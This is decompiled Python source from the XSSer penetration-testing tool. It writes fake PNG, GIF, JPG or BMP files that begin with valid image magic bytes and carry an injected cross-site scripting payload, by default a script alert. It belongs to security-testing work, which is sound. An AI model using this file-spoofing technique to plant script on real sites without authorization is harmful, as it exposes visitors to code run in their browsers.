# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /Users/Dani/Documents/Projects/Golismero_2.0/src_github/tools/xsser/XSSer/imagexss.py
# Compiled at: 2013-12-09 06:41:17
"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2011/2012 psy <root@lordepsylon.net> - <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along 
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os

class ImageInjections(object):

    def __init__(self, payload=''):
        self._payload = payload

    def image_xss(self, filename, payload):
        """
        Create -fake- image with code XSS injected.
        """
        root, ext = os.path.splitext(filename)
        if ext.lower() in ('.png', '.jpg', '.gif', '.bmp'):
            f = open(filename, 'wb')
            user_payload = payload
            if not user_payload:
                user_payload = "<script>alert('XSS')</script>"
            if ext.lower() == '.png':
                content = '‰PNG' + user_payload
            elif ext.lower() == '.gif':
                content = 'GIF89a' + user_payload
            elif ext.lower() == '.jpg':
                content = 'ÿØÿà JFIF' + user_payload
            elif ext.lower() == '.bmp':
                content = 'BMFÖ' + user_payload
            f.write(content)
            f.close()
            image_results = (
             '\nCode: ' + content + '\nFile: ', root + ext)
        else:
            image_results = '\nPlease select a supported extension = .PNG, .GIF, .JPG or .BMP'
        return image_results


if __name__ == '__main__':
    image_xss_injection = ImageInjections('')
    print image_xss_injection.image_xss('ImageXSSpoison.png', "<script>alert('XSS')</script>")